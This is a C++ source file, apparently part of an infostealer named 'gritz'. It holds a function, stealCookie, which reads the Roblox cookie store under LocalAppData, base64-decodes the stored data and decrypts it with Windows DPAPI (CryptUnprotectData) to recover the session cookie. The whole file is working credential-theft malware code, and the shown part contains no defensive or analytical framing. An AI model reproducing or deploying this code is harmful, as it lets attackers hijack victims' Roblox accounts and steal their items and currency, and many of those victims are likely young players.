#include "RobloxCookie.h"

std::vector<uint8_t> gritz::features::roblox::cRobloxCookie::stealCookie()
{
	std::string path = gritz::paths::paths[LocalAppData] + "\\Roblox\\LocalStorage\\RobloxCookies.dat";
	std::ifstream file(path);

	if (!file.is_open())
	{
		return {};
	}

	std::string robloxCookies((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

	json data = json::parse(robloxCookies);
	std::string encoded = data["CookiesData"].get<std::string>();
	
	std::vector<uint8_t> encrypted = base64::decode(encoded);

	if (encrypted.empty())
	{
		return {};
	}

	DATA_BLOB in;

	in.pbData = encrypted.data();
	in.cbData = static_cast<DWORD>(encrypted.size());

	DATA_BLOB out;

	if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, NULL, &out))
	{
		return {};
	}

	std::vector<uint8_t> decrypted(out.pbData, out.pbData + out.cbData);

	LocalFree(out.pbData);

	return decrypted;
}